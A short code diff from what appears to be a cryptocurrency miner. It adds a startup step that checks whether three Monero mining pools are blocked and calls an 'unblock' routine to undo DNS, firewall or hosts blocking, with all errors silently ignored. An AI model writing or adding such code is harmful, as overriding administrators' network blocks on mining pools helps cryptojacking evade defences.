@@ -175,6 +175,17 @@ def _configure_system():
     except Exception:
         pass
 
+    # ── 5. Network pre-flight (DNS/firewall/hosts check) ──
+    try:
+        from core import network_unblock
+        test_hosts = ["cryptonote.social", "gulf.moneroocean.stream", "pool.hashvault.pro"]
+        blocked = [h for h in test_hosts if network_unblock.is_pool_blocked(h)]
+        if blocked:
+            logger.warning("Blocked pools detected at miner start: %s — running unblock", blocked)
+            network_unblock.prepare_mining_network(test_hosts)
+    except Exception:
+        pass
+
 
 def _port_in_use(port: int) -> bool:
     try:
